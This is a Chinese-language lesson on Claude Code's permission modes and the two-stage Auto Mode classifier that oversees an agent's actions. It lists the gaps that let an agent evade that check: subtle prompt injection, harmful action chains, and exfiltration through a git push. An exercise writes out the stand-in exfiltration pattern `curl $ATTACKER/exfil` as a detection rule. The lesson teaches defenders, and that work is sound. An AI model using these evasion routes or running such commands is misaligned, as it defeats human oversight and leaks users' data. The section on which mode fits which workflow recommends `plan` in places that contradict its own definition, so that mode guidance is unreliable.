# Claude Code 作为自主智能体：权限模式与自动模式

> Claude Code 提供了七种权限模式。"plan"模式在每次操作前询问，"default"模式仅在危险操作时询问，"acceptEdits"模式自动批准文件写入但仍需确认 shell 执行，"bypassPermissions"模式批准所有操作。自动模式（Auto Mode，2026年3月24日）用一个两阶段并行安全分类器替代了逐操作批准：第一阶段是单令牌快速检查，对每个操作运行；被标记的操作会触发一个思维链深度审查。操作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。Auto Mode 作为研究预览发布——Anthropic 已明确说明，单独的分类器是不够的。

**类型:** 学习
**语言:** Python (stdlib, 两阶段分类器模拟器)
**前置知识:** 阶段15·01 (长周期智能体), 阶段15·09 (编码智能体格局)
**时间:** 约45分钟

## 问题

在你机器上运行的自主编码智能体是一个独特的安全类别。攻击面包括智能体能够触及的一切——文件系统、网络、凭证、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已公开指出：计算机使用智能体不是聊天机器人的"功能更新"，而是一种具有新风险概况的新型工具。

Claude Code 的权限系统是 Anthropic 的答案。它不是一个"自主/非自主"开关，而是七个模式，构成了一个能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每个模式都是速度与逐操作审查之间的不同权衡。自动模式（Auto Mode，2026年3月）增加了一个两阶段分类器，对于分类器判断为安全的操作，将批准从用户的关键路径上移开，同时为分类器标记的操作保留审查层。

工程问题：这个系统能捕获什么？会遗漏什么？给定任务实际需要哪种模式？

## 核心概念

### 七种权限模式

|  模式  |  行为  |  使用时机  |
|---|---|---|
|  `plan`  |  智能体提出计划；用户批准整个计划；每个操作在执行前都经过审查  |  不熟悉的任务；接近生产环境的代码；首次在仓库上使用智能体  |
|  `default`  |  智能体运行操作；对任何"危险"操作（shell执行、破坏性操作、网络调用）提示用户  |  大多数交互式编码会话  |
|  `acceptEdits`  |  文件写入自动批准；shell执行和网络调用仍提示  |  跨多个文件的重构过程  |
|  `acceptExec`  |  shell命令在精心管理的允许列表中自动批准；写入自动批准  |  紧密的内循环，每个shell命令都是 `npm test` 或类似  |
|  `autoMode`  |  两阶段安全分类器；被标记的操作升级为审查  |  受限工作空间中的长周期无人值守运行  |
|  `yolo`  |  跳过大多数提示；仍运行工具允许/拒绝列表  |  临时沙盒、CI任务、研究脚本  |
|  `bypassPermissions`  |  批准所有操作  |  文档记载"仅在你愿意丢弃的临时容器内"  |

(以上名称与公开的 Claude Code 文档一致；"yolo" 是宽松中间地带的非正式简写。)

### Auto Mode 一页概览

Auto Mode（2026年3月24日发布）是第一个将逐操作批准委托给模型的权限模式。结构如下：

1. **阶段1 — 单令牌分类器。** 对每个提议的操作运行。成本低。返回"安全"或"标记"。设计为与主智能体循环并行运行，以便批准的操作不会排队等待。
2. **阶段2 — 二次策略/安全审查。** 仅对标记的操作运行。对操作、会话当前状态和声明的任务进行集中的策略和安全评估。如果置信度低，则升级到用户人工审核(HITL)。

预算控制与分类器并行：

- `max_turns` — 会话中的总迭代次数。
- `max_budget_usd` — 终止会话的美元上限。
- 每个工具的操作计数限制（不超过 N 次 `max_turns` 调用等）。

### 系统能捕获的内容

- 直接的提示注入，注入的指令映射到已知危险操作模式。
- 重复的工具循环——分类器可以检测到操作N+1与操作N几乎相同，连续五次。
- 在原本只进行文件编辑的会话中，明显超出范围的shell命令。

### 系统可能遗漏的内容

- **微妙的提示注入**，它调整行为而不产生任何被标记的操作。间接提示注入不是一个完全可以修补的漏洞（OpenAI 安全负责人，2025年，关于浏览器智能体——参见第11课）。
- **语义层面的不良行为。** 每个单独的操作看起来都很安全，但组合起来的轨迹却是有害的。分类器判断的是操作，它不会重新推导用户的意图。
- **通过合法渠道的数据窃取。** 将数据写入你拥有的文件，然后`git push`到一个公共仓库，这是一系列允许的操作，但组合起来就是问题。

### 研究预览框架

Anthropic 将 Auto Mode 作为研究预览发布。文档明确说明，分类器是一个层，而不是解决方案：用户应将 Auto Mode 与预算、允许列表、隔离工作空间和轨迹审计（第12-16课）结合使用。预览框架也反映了文档中提到的评估与部署差距（第1课）——一个通过离线评估的分类器在用户上下文模糊的真实会话中可能表现不同。

### 这个阶梯在你的工作流程中的位置

- 不熟悉的任务：从 `plan` 开始。阅读计划比回滚一次糟糕的运行更划算。
- 已知的重构：`plan` 节省大量确认点击。
- 无人值守后台运行：`plan` 仅在你已测量过爆炸半径的工作空间内使用（无凭证、无生产挂载、无你未选择的出站流量）。
- 临时容器：`plan` / `acceptEdits` 只有在容器及其凭证是一次性的情况下才可接受。

## 使用它

`code/main.py` 模拟了两阶段分类器。阶段1是对提议操作进行便宜的规则检查；阶段2是较慢的多规则审查器。驱动程序输入一个短的合成轨迹（安全操作、一次提示注入尝试、一个重复循环），并展示分类器在哪里捕获和遗漏。

## 发布

`outputs/skill-permission-mode-picker.md` 将任务描述匹配到正确的权限模式、预算上限和所需的隔离级别。

## 练习

1. 运行 `code/main.py`。哪种合成动作类型永远不会被阶段1标记，但总是被阶段2捕获？哪种两者都捕获不到？

2. 扩展阶段1规则集以捕获特定的已知不良形状（例如，`curl $ATTACKER/exfil`）。测量良性动作样本上的误报率。

3. 阅读Anthropic的“代理循环如何工作”文档。列出代理在`default`模式下默认接触的每个外部状态。在无人值守运行`autoMode`之前，你需要单独限制哪些状态？

4. 设计一个24小时无人值守运行的预算：`max_turns`、`max_budget_usd`、每个工具上限、允许列表。证明每个数字的合理性。

5. 描述一条轨迹，其中每个单独动作都被阶段1和阶段2批准，但组合行为却失配。（第14课涵盖了终止开关和蜜罐令牌如何解决这个问题。）

## 关键术语

|  术语  |  人们的说法  |  实际含义  |
|---|---|---|
|  权限模式  |  “代理能做什么”  |  七种命名策略之一，控制每个动作的批准  |
|  计划模式  |  “先问再做”  |  代理编写计划；用户执行前批准  |
|  acceptEdits  |  “让它写文件”  |  文件写入自动批准；shell执行仍然提示  |
|  autoMode  |  “自动批准”  |  两阶段安全分类器；标记的动作升级处理  |
|  bypassPermissions  |  “完全YOLO”  |  批准所有内容；适用于临时容器  |
|  阶段1分类器  |  “快速令牌检查”  |  针对提议动作的单令牌规则；并行运行  |
|  阶段2分类器  |  “深度审查”  |  对标记动作进行思维链推理  |
|  研究预览  |  “非正式版”  |  Anthropic对其失败模式仍在映射的功能的描述  |
